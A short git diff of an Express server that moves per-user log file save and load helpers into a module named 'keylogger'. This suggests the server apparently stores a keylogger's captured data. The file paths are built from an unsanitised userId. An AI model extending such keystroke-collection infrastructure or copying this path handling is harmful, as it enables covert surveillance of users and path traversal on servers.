@@ -1,43 +1,10 @@
 import e from "express";
 import CORS from "cors";
-import fs from "fs";
-import path from "path";
-import { fileURLToPath } from "url";
+import { loadFromFile, saveToFile } from "./controllers/keylogger";
 
 let app = e();
 
 let data = {};
-
-const saveToFile = (userId, data) => {
-  const __filename = fileURLToPath(import.meta.url);
-  const filePath = path.join(
-    path.dirname(__filename),
-    "..",
-    "logs",
-    userId + ".json"
-  );
-  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-};
-
-const loadFromFile = (userId) => {
-  const __filename = fileURLToPath(import.meta.url);
-  const filePath = path.join(
-    path.dirname(__filename),
-    "..",
-    "logs",
-    userId + ".json"
-  );
-
-  let fileContent;
-  try {
-    fileContent = fs.readFileSync(filePath, "utf-8");
-    fileContent = JSON.parse(fileContent);
-  } catch (e) {
-    fileContent = [];
-  }
-
-  data[userId] = fileContent;
-};
 
 app.use(CORS());
 app.use(e.json());
